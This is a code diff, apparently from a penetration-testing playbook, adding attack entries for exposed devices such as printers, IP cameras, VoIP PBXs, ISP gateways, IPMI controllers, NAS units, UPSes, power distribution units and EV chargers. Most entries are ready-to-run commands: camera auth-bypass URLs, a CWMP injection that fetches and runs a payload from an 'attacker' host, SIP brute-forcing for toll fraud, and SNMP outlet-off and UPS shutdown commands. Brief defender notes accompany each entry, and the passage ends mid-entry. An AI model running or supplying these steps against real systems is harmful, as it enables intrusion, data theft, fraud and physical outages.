+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Printer", "9100"],
+        "description": ("JetDirect 9100 is a raw socket: PJL commands list every spool "
+                        "job, dump the address book, change the panel display, and on many "
+                        "models read arbitrary files off the embedded filesystem. PostScript "
+                        "to the same port executes arbitrary procedures with file access."),
+        "steps": [
+            "Connect with PRET: `python3 pret.py <ip> pjl` (or `ps`). Try `info config`, "
+            "`info filesys`, `info id`.",
+            "Pull spool jobs already on the printer: `pjl> ls 0:/saveDevice/SavedJobs/"
+            "InProgress/`.",
+            "Dump the address book (HP MFP class): `pjl> get 0:/.../addressbook.csv` "
+            "— often contains corporate email + SMB share creds for scan-to-folder.",
+            "Capture upcoming print jobs: `pjl> capture start` then wait; jobs land in "
+            "the printer's filesystem and you exfil them.",
+            "Change the LCD message (proof of access, low-impact): `pjl> display "
+            "\"PWNED\"`.",
+            "IPP variant: `ipptool -tv ipp://<ip>/ipp/print get-jobs.test` enumerates "
+            "queues without auth on default deployments.",
+        ],
+        "tools": ["PRET", "ipptool (cups)", "metasploit auxiliary/admin/printer/* "],
+    },
+    {
+        "id": "ipcam-default-rtsp",
+        "name": "IP camera — Hikvision/Dahua defaults + RTSP scrape",
+        "severity": "critical",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Hikvision", "Dahua", "RTSP", "camera"],
+        "description": ("IP cameras ship with hardcoded credentials, accept unauth SDK "
+                        "calls, and serve RTSP without auth on the standard path. Once "
+                        "you have the stream you have video; once you have the SDK API "
+                        "you control PTZ, exports, and (on some firmware) the host OS."),
+        "steps": [
+            "Hikvision: confirm via `curl -s http://<ip>/Security/users?auth=YWRtaW46MTIzNDU=` "
+            "(default admin/12345 base64). CVE-2017-7921 unauth: "
+            "`http://<ip>/system/configurationFile?auth=YWRtaW46MTEK` dumps cfg + creds.",
+            "Dahua: CVE-2021-33044/33045 — POST `{ \"method\": \"global.login\", \"params\": "
+            "{\"clientType\": \"NetKeyboard\"} }` to /RPC2_Login bypasses auth.",
+            "Generic RTSP: `ffprobe rtsp://<ip>/Streaming/Channels/1` (Hikvision), "
+            "`rtsp://<ip>/cam/realmonitor?channel=1&subtype=0` (Dahua), or "
+            "`rtsp://<ip>/h264.sdp`. Test with and without `admin:admin`.",
+            "Persistence: many cameras run a busybox shell — `telnet <ip>` on root/blank.",
+            "Defender side: firmware patch; isolate cameras to a no-egress VLAN; force "
+            "new admin password at install (modern Hikvision/Dahua firmware enforces this).",
+        ],
+        "tools": ["Cameradar", "Camerattack", "iSpy/ONVIFManager", "ffprobe / VLC",
+                  "metasploit exploit/linux/http/dlink_dir850l_unauth_exec (related)"],
+    },
+    {
+        "id": "voip-sip-takeover",
+        "name": "SIP/VoIP — extension enum, registrar brute, toll fraud",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["SIP", "VoIP"],
+        "description": ("UDP/5060 lets you OPTIONS-ping the PBX, OPTIONS/REGISTER scan "
+                        "for valid extensions, then digest-auth brute. Registered as a "
+                        "phone you can place outbound calls billed to the company."),
+        "steps": [
+            "Enumerate extensions: `svwar -e100-9999 <pbx>` (SIPVicious) — distinguishes "
+            "401 (valid ext, wrong pass) from 404 (no ext).",
+            "Brute the digest: `svcrack -u <ext> -d passwords.txt <pbx>`. Phones often "
+            "use their own extension as the password.",
+            "Once registered, place a call: `baresip -e '/dial 011<intl>'` — outbound "
+            "to a high-rate destination = toll fraud (10s of thousands of dollars in "
+            "minutes if the PBX has no rate-limiting).",
+            "RTP eavesdrop: `tshark -i <iface> -f 'udp portrange 10000-20000' -T "
+            "rtp.payload` + Wireshark Telephony → RTP Streams → Play.",
+            "Defender side: TLS-SIP (5061) + SRTP; geo-fence allowed-destinations "
+            "and rate-limit outbound INVITEs at the SBC.",
+        ],
+        "tools": ["SIPVicious (svwar / svcrack / svmap)", "Mr.SIP", "PJSUA / baresip",
+                  "Wireshark RTP analysis"],
+    },
+    {
+        "id": "cwmp-acs-hijack",
+        "name": "TR-069 / CWMP — rogue ACS → mass gateway takeover",
+        "severity": "critical",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["TR-069", "CWMP", "7547"],
+        "description": ("CWMP (TCP/7547) is the ISP's management channel. Exposed to the "
+                        "WAN it's been Mirai's foothold for years (CVE-2016-10372 command "
+                        "injection in NewNTPServer / SetParameterValues). Locally on the "
+                        "LAN, a rogue ACS pushes a new config to every gateway."),
+        "steps": [
+            "Confirm WAN exposure: `nmap -p7547 --open <ip-range>`.",
+            "Test CVE-2016-10372 (the original Mirai variant): "
+            "`curl -d '<...NewNTPServer1>;wget -O /tmp/x http://attacker/x;sh /tmp/x;...</...>' "
+            "http://<gw>:7547/UD/act?1`.",
+            "Local ACS hijack (rogue): change DHCP option 43 / 125 vendor-specific to "
+            "`URL=http://attacker/acs;Username=...;Password=...`. Every gateway on the "
+            "segment polls you on next periodic-inform.",
+            "Push config: serve a CWMP Inform reply with `SetParameterValues` containing "
+            "InternetGatewayDevice.ManagementServer.URL and credential params → "
+            "ownership stays after reboot.",
+            "Defender side: 7547 ingress allowed only from the ISP's known ACS CIDRs; "
+            "patch firmware; use TLS-CWMP (`https://` ACS URL) with certificate pinning.",
+        ],
+        "tools": ["GenieACS (legit, useful for understanding)",
+                  "metasploit auxiliary/scanner/http/tr069_ntpserver",
+                  "Python rogue DHCP (scapy)"],
+    },
+    {
+        "id": "mqtt-broker-pillage",
+        "name": "MQTT broker — anon SUBSCRIBE → every IoT device's telemetry",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["MQTT"],
+        "description": ("Default Mosquitto/HiveMQ allows anonymous connect with no ACL. "
+                        "Subscribing to `#` pulls every topic; publishing to `homeassistant/` "
+                        "or `zwave/` topics actuates devices."),
+        "steps": [
+            "Connect anonymous: `mosquitto_sub -h <broker> -t '#' -v` — wildcard "
+            "subscription. Every device's telemetry streams to your terminal.",
+            "Look for credentials in topics: many IoT devices publish their config "
+            "(WiFi PSK, API tokens, MAC + serial) at startup under `device/<id>/info`.",
+            "Actuate: `mosquitto_pub -h <broker> -t 'homeassistant/light/<id>/set' "
+            "-m '{\"state\":\"on\",\"brightness\":255}'`.",
+            "Subscribe to retain-flag = true messages → historical config snapshots.",
+            "Defender side: `allow_anonymous false` in mosquitto.conf + ACL file per "
+            "client cert / username; 8883 with mutual TLS; never expose 1883 outside "
+            "the device VLAN.",
+        ],
+        "tools": ["mosquitto-clients (sub/pub)", "MQTTX", "metasploit "
+                  "auxiliary/gather/mqtt_subscribe"],
+    },
+    {
+        "id": "cast-screen-hijack",
+        "name": "Chromecast / Google Cast — LAN-CSRF screen hijack",
+        "severity": "medium",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Chromecast", "Cast"],
+        "description": ("Cast receivers (8008/8009) accept app-launch from any device on the "
+                        "LAN with no auth. A webpage running on a phone joined to the same "
+                        "Wi-Fi can throw a screen to every Chromecast in the office. "
+                        "CastHack (2018) abused this at scale."),
+        "steps": [
+            "Discover: `dns-sd -B _googlecast._tcp` or mDNS over the LAN. Each receiver's "
+            "friendly name + IP becomes a target.",
+            "App-launch: POST to `http://<cast>:8008/apps/YouTube` with body "
+            "`v=<youtube-id>&t=0` — that video plays on the TV instantly.",
+            "Custom payload: register a free Cast developer app, then POST your app's "
+            "ID. Your receiver-side JS runs on the TV with full media-namespace control.",
+            "Persistence: receivers cache the last URL — if your launch URL was an HTTPS "
+            "page with permanent JS that polls for commands, it stays after the screen "
+            "looks idle.",
+            "Defender side: enable 'Guest mode = off' on each receiver; isolate cast "
+            "endpoints to a media-only VLAN; block port 8008 inbound from user VLANs.",
+        ],
+        "tools": ["pychromecast", "go-chromecast", "BeeCast", "Castle"],
+    },
+    {
+        "id": "ipmi-rakp-crack",
+        "name": "IPMI BMC — RAKP+1 hash crack → KVM + virtual-media RCE",
+        "severity": "critical",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["IPMI", "BMC"],
+        "description": ("IPMI 2.0's RAKP+1 message contains an HMAC of the user's password — "
+                        "any anonymous probe can request it, then crack offline. With root "
+                        "on the BMC you attach a virtual CD-ROM and boot the host into "
+                        "whatever you want."),
+        "steps": [
+            "Dump the RAKP hash: `ipmitool -I lanplus -H <bmc> -U admin -P 'x' user "
+            "list` triggers it. Capture with the metasploit module "
+            "`auxiliary/scanner/ipmi/ipmi_dumphashes` — outputs a hashcat-ready string.",
+            "Crack: `hashcat -m 7300 hashes rockyou.txt` — generally fast because BMC "
+            "default passwords are short.",
+            "If `cipher 0` is enabled: skip the crack, "
+            "`ipmitool -I lanplus -C 0 -H <bmc> -U <any> -P <any> user list` works "
+            "without a valid password.",
+            "With root: launch the Java/HTML5 KVM, mount a Kali ISO via Virtual Media, "
+            "reboot the host, single-user shell → /etc/shadow.",
+            "Defender side: BMC on a dedicated mgmt VLAN no L3 to user nets; disable "
+            "cipher 0 (`ipmitool lan set 1 cipher_privs Xaaaaaaaaaaaaaa`); strong "
+            "admin password.",
+        ],
+        "tools": ["ipmitool", "hashcat (mode 7300)", "metasploit ipmi_dumphashes",
+                  "iDRAC / iLO native KVM via web"],
+    },
+    {
+        "id": "nas-cve-pillage",
+        "name": "NAS appliance (Synology/QNAP) — vendor CVE → root + data",
+        "severity": "critical",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["NAS", "Synology", "QNAP"],
+        "description": ("Consumer/SMB NAS units are first-class ransomware targets: QLocker, "
+                        "DeadBolt, QSnatch, Synolocker. The vendors' CVE lists average a "
+                        "high-severity unauth-RCE every 2-3 months — patching lag is the "
+                        "norm because owners don't realize the box has its own OS."),
+        "steps": [
+            "Banner-grab the DSM/QTS web UI: `curl -s -k https://<nas>:5001/webapi/entry.cgi"
+            "?api=SYNO.API.Info&method=Query&version=1` reveals exact build.",
+            "Recent example chains: Synology DSM CVE-2024-10446 (Hyper Backup auth bypass); "
+            "QNAP CVE-2024-21899 weak-creds → admin; QNAP CVE-2022-27593 (DeadBolt) — pick "
+            "the right exploit for the build.",
+            "Pull `/etc/shadow` after root → crack offline. Pivot to AD via SMB share "
+            "credentials cached on the NAS.",
+            "Loot: shares often hold finance/HR; check `/volume1/homes/<user>/` for SSH "
+            "keys + cloud-cli credentials.",
+            "Defender side: patch within 48h of vendor advisory; never expose DSM/QTS "
+            "or QuickConnect/myQNAPcloud to the internet; isolate NAS to a server VLAN.",
+        ],
+        "tools": ["Burp Suite", "metasploit (Synology/QNAP modules)",
+                  "exploitdb / vendor PSIRT"],
+    },
+    {
+        "id": "wps-pixie-dust",
+        "name": "Wi-Fi WPS Pixie-Dust → recover PSK in seconds",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["WPS", "Quantenna", "WFADevice"],
+        "description": ("Pixie-Dust (Bongard 2014) attacks the offline-derivable nonces in "
+                        "the WPS Registrar exchange on vulnerable chipsets (Ralink, Realtek, "
+                        "older Broadcom, some Quantenna). One handshake → PIN → PSK, no "
+                        "online brute needed."),
+        "steps": [
+            "Capture the AP: `airmon-ng start <iface>`; `wash -i <mon>` lists WPS-enabled APs "
+            "with their VendorID — that tells you if Pixie is likely.",
+            "Run Pixie via Reaver: `reaver -i <mon> -b <bssid> -K 1 -vvv`. Vulnerable "
+            "chipsets crack in <5 s.",
+            "If Pixie fails but the AP has no PIN lockout: online brute "
+            "`reaver -i <mon> -b <bssid>` — 11 k PINs total.",
+            "PSK falls out of the WPS exchange directly. Connect, then pivot LAN-side.",
+            "Defender side: disable WPS at the AP admin UI (the only fix); if a captive "
+            "client mode forces WPS on, swap the AP.",
+        ],
+        "tools": ["aircrack-ng (airmon/wash)", "Reaver (Pixie mode)",
+                  "bully", "wifite (automation)"],
+    },
+    {
+        "id": "tftp-config-pull",
+        "name": "TFTP — pull running configs / firmware off network gear",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["TFTP"],
+        "description": ("TFTP is unauth read/write. Most enterprises run a TFTP server next "
+                        "to their switches/phones for config backup. Guess the filename "
+                        "(predictable: `<hostname>-confg`, `running-config`, `e1000.img`) "
+                        "and you have every device's secrets."),
+        "steps": [
+            "Probe: `tftp <server>` then `get running-config` / `get <hostname>-confg` "
+            "/ `get <hostname>.cfg`. Cisco IOS auto-backups use the device hostname.",
+            "Mass-pull: `nmap -p69 --script tftp-enum --script-args tftp-enum.filelist=names.txt "
+            "<server>`. Custom names list per environment.",
+            "Cisco config parsing: extract Type-7 (instant), enable secret (hashcat 5700/9200), "
+            "SNMP RW community, VTY ACLs, TACACS server IP + key (often weak/recycled).",
+            "Voice configs: 7920/CP-7960 phones pull `SEP<mac>.cnf.xml` → extension creds.",
+            "Defender side: TFTP only between a config-backup server and authorized devices "
+            "on a mgmt VLAN; everywhere else block UDP/69.",
+        ],
+        "tools": ["tftp client", "nmap tftp-enum NSE", "metasploit auxiliary/admin/tftp/*"],
+    },
+    {
+        "id": "smart-tv-pwn",
+        "name": "Smart TV — LAN-CSRF, debug-port shell, app injection",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Smart TV"],
+        "description": ("Smart TVs (Samsung Tizen, LG webOS, Vizio SmartCast, Android TV) "
+                        "run aging WebKit/Chromium with DIAL + HbbTV + vendor-specific REST "
+                        "APIs. Same-LAN attackers control input, mount payloads via "
+                        "side-loaded apps, or hit debug ports the vendor forgot to close."),
+        "steps": [
+            "Vendor fingerprint: `curl -s http://<tv>:1925/system` (Philips JointSpace), "
+            "`http://<tv>:8001/api/v2/` (Samsung), `http://<tv>:3001/` (LG webOS) → "
+            "model + firmware version.",
+            "Samsung Tizen: WebSocket API at `ws://<tv>:8001/api/v2/channels/samsung."
+            "remote.control` accepts arbitrary KEY events with no auth on most pre-2022 "
+            "firmware (RemoteApp pairing bug).",
+            "LG webOS: hbbtv + DIAL launch take input from the same LAN. CVE-2023-6317 / "
+            "-6318 / -6319 chain → root over the LAN admin port.",
+            "Vizio SmartCast: HTTPS API on 9000/443, undocumented `key_command` endpoints "
+            "accept input with the pairing token stored in the app's preferences.",
+            "If a debug port (`adb` on 5555 for Android TV, `telnet` on 23 for older "
+            "webOS) is open: instant root.",
+            "Defender side: media VLAN with no egress to user devices; vendor firmware "
+            "updates; disable network input on TVs that don't need cast/airplay.",
+        ],
+        "tools": ["curl + websocat", "samsung-tv-ws-api", "lg-tv-exploit (TheSmartHacker)",
+                  "adb (Android TV)", "TizenBrew"],
+    },
+    {
+        "id": "airplay-receiver-pwn",
+        "name": "AirPlay receiver — LAN media push + protocol CVE chain",
+        "severity": "medium",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["AirPlay"],
+        "description": ("AirPlay 1 / 2 receivers (Apple TV, third-party speakers, modern "
+                        "TVs) accept anonymous media-push by default. AirPlay 2 protocol "
+                        "had multiple LAN-reachable bugs (CVE-2021-30892 / -30877 in older "
+                        "tvOS, AirBorne CVEs in third-party libs)."),
+        "steps": [
+            "Discover: `dns-sd -B _airplay._tcp` then `_raop._tcp` for audio. Note "
+            "model/firmware in TXT records.",
+            "Push media: `atvremote --id <atv-id> play_url http://<your-server>/film.mp4`. "
+            "Older Apple TVs / TVs accept this without pairing.",
+            "Cred capture: AirPlay 1 used SAP/MAYDAY anonymous authentication; capture "
+            "the pairing PIN flow with Wireshark `airtunes` dissector for offline crack.",
+            "AirBorne (April 2025) third-party AirPlay-SDK CVEs: many smart speakers "
+            "running unpatched SDK fall to LAN unauth RCE.",
+            "Defender side: enable AirPlay password per receiver; restrict to a guest "
+            "Wi-Fi; firmware ≥ tvOS 15.1.",
+        ],
+        "tools": ["atvremote (pyatv)", "OwnTone (audio interop)",
+                  "Wireshark airtunes/RAOP dissector", "AirBorne PoC tools"],
+    },
+    {
+        "id": "plex-rce-chain",
+        "name": "Plex Media Server — known CVEs → server RCE",
+        "severity": "critical",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Plex"],
+        "description": ("Plex on tcp/32400 has had repeated unauth/auth-bypass RCEs "
+                        "(CVE-2020-5740 Python pickle deserialization → RCE; CVE-2023-25193 "
+                        "Plex Relay token exposure; SSRF + path traversal earlier years). "
+                        "Plex.tv cloud-account compromise also pivots in."),
+        "steps": [
+            "Banner: `curl -s -k 'http://<plex>:32400/identity'` → version. Match the "
+            "exact version against Plex changelog for known CVEs.",
+            "If pre-1.19.3 (CVE-2020-5740): photo-library `Camera Upload` pickle RCE — "
+            "PoC is public.",
+            "If owner reuses their Plex.tv account password elsewhere: the cloud bridge "
+            "auto-authenticates on every LAN client → effective LAN admin.",
+            "Token exposure: `https://plex.tv/api/resources?X-Plex-Token=...` from a "
+            "stolen pin grants server-list and remote-control privileges.",
+            "Defender side: patch immediately; require 2FA on the Plex.tv account; "
+            "disable Remote Access if not needed.",
+        ],
+        "tools": ["curl + jq", "CVE-2020-5740 PoC (mauricelambert / publicly available)",
+                  "Plex CLI tools"],
+    },
+    {
+        "id": "octoprint-rce-takeover",
+        "name": "OctoPrint / Klipper-Moonraker — anon API → arbitrary G-code",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["OctoPrint", "Klipper"],
+        "description": ("OctoPrint / Mainsail / Fluidd ship with no auth on the REST API "
+                        "by default. Upload G-code = print whatever you want. Disable "
+                        "thermal-runaway in printer config + send a malicious G-code = "
+                        "fire hazard."),
+        "steps": [
+            "Probe: `curl -s http://<host>:5000/api/version`. Without an API key the "
+            "endpoint responds — that's a misconfiguration in itself.",
+            "Upload: `curl -X POST -H 'X-Api-Key: <key-or-blank>' -F file=@pwn.gcode "
+            "http://<host>:5000/api/files/local?select=true&print=true`.",
+            "Klipper / Moonraker: WebSocket on 7125 — same surface. `moonraker-api` "
+            "Python client.",
+            "Defender side: enable access control wizard in OctoPrint; require API "
+            "key on Moonraker; never expose 5000/7125 outside LAN.",
+        ],
+        "tools": ["curl", "moonraker-api", "OctoPrint Plugin API"],
+    },
+    {
+        "id": "hue-bridge-link",
+        "name": "Philips Hue / Lutron — local API exposure + link-button bypass",
+        "severity": "medium",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["light hub"],
+        "description": ("Hue creates a username when the link button is pressed; the API "
+                        "is then plaintext-HTTP with no per-request auth. Once you have "
+                        "the username token, you own every light + dependent automation."),
+        "steps": [
+            "Probe: `curl http://<bridge>/api/<token>/config`. If you don't have a token, "
+            "social-engineer a press of the link button (or capture from a partner "
+            "device's HAR file).",
+            "Recon: `curl http://<bridge>/api/<token>/lights` enumerates every fixture; "
+            "`/groups`, `/scenes`, `/sensors` (motion data).",
+            "Actuate: `curl -X PUT http://<bridge>/api/<token>/lights/1/state -d "
+            "'{\"on\":false}'`. Useful as proof; combined with sensor data, gives a "
+            "presence-detection oracle.",
+            "Defender side: bridge on isolated VLAN; rotate tokens (delete unused "
+            "`whitelist` entries); patch firmware (CVE-2020-6007 buffer overflow over "
+            "Zigbee was bridge-RCE-class).",
+        ],
+        "tools": ["curl", "phue (Python)", "Hue Essentials"],
+    },
+    {
+        "id": "nut-ups-control",
+        "name": "Network UPS (NUT) — status read + shutdown command",
+        "severity": "medium",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["NUT", "UPS"],
+        "description": ("NUT on tcp/3493 lets you read UPS status without auth and — "
+                        "with a low-priv password — issue shutdown commands. Bringing "
+                        "down a UPS during business hours powers off whatever's behind "
+                        "it (servers, switches, sometimes datacenter rows)."),
+        "steps": [
+            "Read: `upsc <ups>@<host>` shows model + battery + load. "
+            "`upsc -L <host>` lists every configured UPS.",
+            "Acquire creds: NUT shared creds usually live in /etc/nut/upsmon.conf on "
+            "the monitor host (which often runs other services with weaker security).",
+            "Shutdown: `upscmd -u <user> -p <pass> <ups>@<host> shutdown.return` — "
+            "the load drops, the UPS shuts down at its configured grace period.",
+            "Defender side: 3493 restricted to monitor host; auth required on every "
+            "command (`monuser` separate from `admin`); UPS on dedicated mgmt VLAN.",
+        ],
+        "tools": ["upsc / upscmd / upsrw (NUT)", "Metasploit auxiliary/admin/scada/nut"],
+    },
+    {
+        "id": "apc-nmc-pillage",
+        "name": "APC NMC / Eaton ePDU — default creds + SNMP outlet control",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["APC", "Eaton", "power management"],
+        "description": ("APC Network Management Cards (NMC) and Eaton ePDUs default to "
+                        "`apc/apc` (web) and SNMP `public` / `private`. With either, "
+                        "you can power-cycle, schedule outage windows, or simply "
+                        "outlet-off mission-critical equipment."),
+        "steps": [
+            "Web: `curl -s http://<apc>/logon.htm` → POST credentials. Try `apc/apc`, "
+            "`device/device`, `admin/admin`. Older firmware exposes serial console "
+            "via the same web UI.",
+            "SNMP: `snmpwalk -v2c -c public <apc> 1.3.6.1.4.1.318.1.1.4` lists outlets; "
+            "`snmpset -v2c -c private <apc> 1.3.6.1.4.1.318.1.1.4.4.2.1.3.<outlet> i 2` "
+            "outlet-off (PowerNet-MIB).",
+            "Schedule: web admin lets you set a daily reboot — long-game persistence.",
+            "Defender side: rotate `apc/apc`; SNMPv3 authPriv only; restrict web admin "
+            "to mgmt VLAN; firmware ≥ AOS 7.0.",
+        ],
+        "tools": ["curl", "snmpwalk / snmpset", "Hydra (web brute APC)",
+                  "Metasploit auxiliary/scanner/snmp/snmp_set"],
+    },
+    {
+        "id": "pjlink-projector-takeover",
+        "name": "PJLink projector — empty-password takeover + meeting hijack",
+        "severity": "medium",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["PJLink"],
+        "description": ("PJLink on tcp/4352 controls every JBMIA-conformant projector "
+                        "(Epson, NEC, Panasonic, Sony, ViewSonic). Default password is "
+                        "empty on Class-1 or 'default' on Class-2 — power, source, mute, "
+                        "freeze, channel."),
+        "steps": [
+            "Probe: `nc <host> 4352` → device responds `PJLINK 0` (no auth) or "
+            "`PJLINK 1 <8hex>` (challenge for MD5(pass + challenge)).",
+            "If challenge: try MD5(empty + challenge) (firmware default) or "
+            "MD5('JBMIAProjectorLink' + challenge) on some makes.",
+            "Commands: `POWR 1` (on), `POWR 0` (off), `INPT 11` (source switch), "
+            "`AVMT 31` (blank screen). All effective during a live meeting.",
+            "Defender side: rotate PJLink password; restrict tcp/4352 to AV-control "
+            "VLAN.",
+        ],
+        "tools": ["nc / pjlink CLI", "Python pypjlink", "OBS PJLink plugin"],
+    },
+    {
+        "id": "wireless-presentation-pwn",
+        "name": "Wireless presentation (ClickShare/Solstice/AirMedia) — admin + Wi-Fi pivot",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["presentation"],
+        "description": ("Wireless-presentation appliances bridge wired LAN to wireless "
+                        "client devices. Admin UIs default to vendor creds and "
+                        "frequently store the corporate Wi-Fi PSK in plain (CVE-2019-18827 "
+                        "Barco, ClickShare auth bypass)."),
+        "steps": [
+            "Fingerprint: `curl -s http://<host>/` → vendor (Barco/Mersive/Crestron "
+            "stamp in HTML title). For Barco: `/cgi-bin/quick_setup.cgi`.",
+            "Defaults: ClickShare `admin/admin`, Solstice `admin/<serial-last-4>`, "
+            "AirMedia `admin/admin`.",
+            "Once in: read out corporate Wi-Fi PSK (often stored under "
+            "Network → Enterprise SSID), guest SSID PSK, and any AD bind credentials "
+            "for calendar integration.",
+            "ClickShare unauth CVE-2019-18827: GET `/api/v1.5/Configuration/` dumps "
+            "the entire config on unpatched firmware.",
+            "Defender side: rotate default; patch firmware; don't let the device "
+            "join the corporate Wi-Fi profile — give it wired-only.",
+        ],
+        "tools": ["curl", "Hydra (web brute)", "Burp Suite",
+                  "Barco/Solstice CVE PoCs"],
+    },
+    {
+        "id": "crestron-control-takeover",
+        "name": "Crestron / AMX — default Toolbox port → full room automation",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Crestron"],
+        "description": ("Crestron control processors expose Toolbox (41794) and CIP "
+                        "(41795). A surprising number leave them open with no admin "
+                        "password (default behavior on older firmware). With Toolbox "
+                        "access you reflash the program — total control of every "
+                        "actuator the processor drives (HVAC, AV, shades, door locks)."),
+        "steps": [
+            "Probe: `nc <host> 41794` → blank prompt = no auth required. Try "
+            "`hostname` then `ver`.",
+            "Pull the program: Toolbox commands `progcomments`, `progsize` reveal the "
+            "loaded SIMPL Windows / Lua program. Download with the Crestron Toolbox "
+            "GUI from your PC.",
+            "Reflash: load a modified `.smw` (signal control logic) to redirect "
+            "actions. Trivial mischief (room-blackout on demand); serious risk if "
+            "the room is OT-adjacent (data center cooling).",
+            "Defender side: set MODE=`Restricted`, set admin password, disable Toolbox "
+            "TCP port if not in use, segregate AV control to its own VLAN.",
+        ],
+        "tools": ["nc", "Crestron Toolbox (vendor GUI)",
+                  "official `simpl-windows` ↔ wire telnet"],
+    },
+    {
+        "id": "dlna-traversal",
+        "name": "DLNA / UPnP MediaServer — content browse + miniDLNA traversal",
+        "severity": "medium",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["DLNA", "MediaServer"],
+        "description": ("UPnP MediaServers (miniDLNA, Plex DLNA fallback, NAS-built-in) "
+                        "expose content with no auth on LAN — interesting both as a "
+                        "content-exfil channel and (older miniDLNA, CVE-2020-12695) "
+                        "as a path-traversal RCE vector."),
+        "steps": [
+            "Discover: SSDP M-SEARCH `urn:schemas-upnp-org:device:MediaServer:1` → "
+            "LOCATION → description XML.",
+            "Browse content: `curl -X POST -H 'SOAPAction: \"urn:schemas-upnp-org:"
+            "service:ContentDirectory:1#Browse\"' -d <browse.xml> http://<host>:8200/"
+            "ctl/ContentDir`.",
+            "miniDLNA <1.1.5: CallStranger CVE-2020-12695 — UPnP SUBSCRIBE callback "
+            "reflects arbitrary URLs as the server (SSRF + amplifier). Some "
+            "implementations leaked /etc/passwd via `Range: bytes=` on file URLs.",
+            "Defender side: upgrade miniDLNA; bind to LAN-only IFs; share only "
+            "media-only directories.",
+        ],
+        "tools": ["upnpc", "Wireshark UPnP dissector", "miniDLNA PoCs"],
+    },
+    {
+        "id": "iot-hub-pillage",
+        "name": "Smart-home hub — token theft → every IoT device on LAN",
+        "severity": "critical",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Smart-home hub"],
+        "description": ("Smart-home hubs (SmartThings, Hubitat, Wink, Vera, Home Assistant) "
+                        "store API tokens and cloud-account creds for every paired device. "
+                        "Compromise the hub = compromise the entire IoT footprint, often "
+                        "including locks, garage doors, and presence sensors."),
+        "steps": [
+            "Fingerprint: `curl http://<hub>:8123/api/` (Home Assistant), "
+            "`http://<hub>:39500/elevate/` (Hubitat). Most hubs default to no auth "
+            "on the LAN-side API for initial setup.",
+            "If Home Assistant: `/api/states` and `/api/services` give full read + "
+            "control. CVE-2022-3859 supervisor auth bypass (patched) gave LAN RCE.",
+            "If Hubitat / SmartThings: scrape `/api/devices` and pull the master "
+            "Z-Wave / Zigbee join keys → join-as-controller for new devices.",
+            "Token loot: hubs commonly store IFTTT / Alexa / Google Home OAuth tokens "
+            "in their local DB — those tokens grant cloud-side access too.",
+            "Defender side: enable hub login (turn off `localOnly` exemptions); "
+            "isolate IoT VLAN; patch firmware promptly.",
+        ],
+        "tools": ["curl + jq", "Home-Assistant CLI",
+                  "metasploit aux/scanner/home_assistant_*"],
+    },
+    {
+        "id": "ev-charger-ocpp-fraud",
+        "name": "EV charger (OCPP) — remote start/stop + meter spoof",
+        "severity": "high",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["EV charger", "OCPP"],
+        "description": ("Many EV chargers (ChargePoint, Wallbox, Easee, generic OCPP) "
+                        "speak OCPP-J 1.6 / 2.0 over a WebSocket on tcp/9000 with no "
+                        "TLS or auth. With a fake CSMS you steer transactions or "
+                        "convince the charger it's free."),
+        "steps": [
+            "Identify the OCPP CSMS URL the charger normally connects to "
+            "(`ws://<server>:9000/ocpp/<charger-id>`).",
+            "Stand up a rogue CSMS: `python -m ocpp` example server. Redirect via "
+            "rogue DHCP + DNS, or by editing the charger's config UI.",
+            "Send `RemoteStartTransaction` to start a session for any RFID UID; "
+            "send `MeterValues` with zero energy → free charging fraud.",
+            "Sniff transactions: WebSocket frames are plaintext JSON — pull RFID UIDs "
+            "+ transaction history from the on-segment capture.",
+            "Defender side: require OCPP-J over TLS (wss://); enforce mutual auth; "
+            "cryptographically signed firmware updates.",
+        ],
+        "tools": ["Python `ocpp` library", "websocat", "Wireshark WebSocket dissector",
+                  "Metasploit auxiliary/admin/scada/ev_charger_*"],
+    },
+    {
+        "id": "solar-inverter-takeover",
+        "name": "Solar inverter — installer PIN + Speedwire control",
+        "severity": "medium",
+        "phase": "device",
+        "match_any_category": ["device-exposure"],
+        "match_substring": ["Solar", "inverter"],
+        "description": ("SMA SunnyBoy, Fronius Symo, and Enphase Envoy ship with web UIs "
+                        "that accept a static installer PIN (often a function of the "
+                        "serial number). Attackers in the same LAN can change export "
+                        "limits, modify grid feed, or disable the inverter entirely."),
+        "steps": [
+            "SMA: web UI on tcp/80, login `installer/<sma-installer-pin>` — published "
+            "in installer manuals; some old firmware has hardcoded `0000`.",
+            "Fronius: Solar.web app + local Datamanager card. CVE-2019-19229 "
+            "unauth setup endpoint allows config changes.",
+            "Enphase Envoy: `installer:<envoy-installer-pin>` via `/installer` URL. "
+            "CVE-2022-29349 default-creds class.",
+            "Operational impact: change feed-in tariff settings → underpaid revenue; "
